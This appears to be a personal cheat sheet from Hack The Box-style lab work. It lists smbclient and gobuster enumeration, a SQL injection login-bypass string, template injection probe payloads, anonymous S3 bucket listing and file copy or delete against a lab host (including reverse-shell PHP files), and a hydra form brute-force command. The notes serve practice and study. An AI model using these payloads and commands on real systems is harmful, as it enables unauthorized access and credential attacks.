---
# the default layout is 'page'
icon: fas fa-info-circle
order: 4
---

# enumeartion

## smb

```
smbclient -L 10.129.189.194
```

## web

### gobuster

```
# enumeration directories
gobuster dir -u http://DOMAIN -w /usr/share/wordlists/dirb/common.txt

# enumerate vhosts
gobuster vhost --append-domain -u http://DOMAIN -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

### wappalyzer

- used to identify website technologies
- install as browser extension via chrome web store

### sqli

login bypass
```
' or 1=1 #
```

### ssti

> great writeup on [fingerprinting languages and template engines](https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756) 

1. fingerprint language used on server (i.e. python, php, js, nodejs, etc) 
2. find input field to test
3. using identified language as a guide, narrow down the payloads to try

#### payloads

characters to test
```
${{<%[%'"}}%\.
```
common payloads to test
```
${7*7}
${{7*7}}
#{7*7}
#{ 7 * 7 }
*{7*7}
@{7*7}
~{7*7}
[[7*7]]
[[${7*7}]]
[(7*7)]
{7'*7'}
<%= 7 * 7 %>
<%7*7%>
```

[hacktricks](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html) has a good bit of info on other payloads and their corresponding template engines too

## cloud

### aws

#### setup

use python to create virtual environment and install `awscli`
```
$ python3 -m venv htb_three

$ source htb_three/bin/activate

$ pip3 install awscli                 
Collecting awscli
```

#### enumeration

```
# anonymous login
aws s3 ls --endpoint-url http://s3.thetoppers.htb                                   
aws s3 ls s3://s3.thetoppers.htb --no-sign-request

# configure a profile (have to enter fake or real values - i.e. no empties)
aws configure --profile htb_three

# list bucket
aws s3 ls --profile htb_three --endpoint-url http://s3.thetoppers.htb

# list contents recursively
aws s3 ls --profile htb_three --endpoint-url http://s3.thetoppers.htb --recursive s3://thetoppers.htb

# copy contents
aws s3 cp --profile htb_three --endpoint-url http://s3.thetoppers.htb s3://thetoppers.htb/shell.php .

# delete contents
aws s3 rm --profile htb_three --endpoint-url http://s3.thetoppers.htb s3://thetoppers.htb/php-reverse-shell.php
```

# multipurpose tools

## hydra

- web form with username and password list

```
hydra -l [username] -P [path_to_passwd_list] -t 10 http-post-form [domain] "/URI:username=^USER^&password=^PASSWORD^:Cookie="
```